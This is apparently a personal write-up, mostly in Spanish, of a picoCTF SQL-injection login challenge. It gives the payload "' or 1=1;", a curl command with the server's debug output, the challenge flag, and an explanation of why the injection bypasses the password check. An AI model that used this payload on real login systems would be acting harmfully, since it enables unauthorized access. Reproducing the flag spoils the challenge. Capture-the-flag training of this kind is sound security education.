# DESCRIPCIÓN:
Do you think you can log us in? Try to see if you can login!

Hints: 
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.

# SOLUCIÓN:
#### picoCTF{s0m3_SQL_85832275}

Después de cambiar en el código fuente ```
```
<input type="hidden" name="debug" value="0">
```
Quitando el hidden y cambiando el input a 1:

```
username: hola' or 1=1;
password: password
SQL query: SELECT * FROM users WHERE name='hola' or 1=1;' AND password='password'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```

O también se puede así:```
```
┌──(mony㉿Mony)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:55184/login.php -d "username=admin' or 1=1;&password=hola&debug=1"
<pre>username: admin' or 1=1;
password: hola
SQL query: SELECT * FROM users WHERE name='admin' or 1=1;' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>
```
# NOTAS ADICIONALES:
Técnicamente, la función es inyectar un true absoluto en la consulta SQL del servidor.

- **`'`**: Cierra la variable del usuario.
    
- **`OR 1=1`**: Obliga a que la cláusula `WHERE` evalúe a verdadero.
    
- **`;`**: Corta la consulta para que el motor simplemente ignore el código que valida el password.
    
**Resultado:** La consulta devuelve datos válidos (generalmente el admin) y el backend te da acceso. 

# REFERENCIAS:
[http://fickle-tempest.picoctf.net:63261](http://fickle-tempest.picoctf.net:63261/).
https://webshell.cylabacademy.org/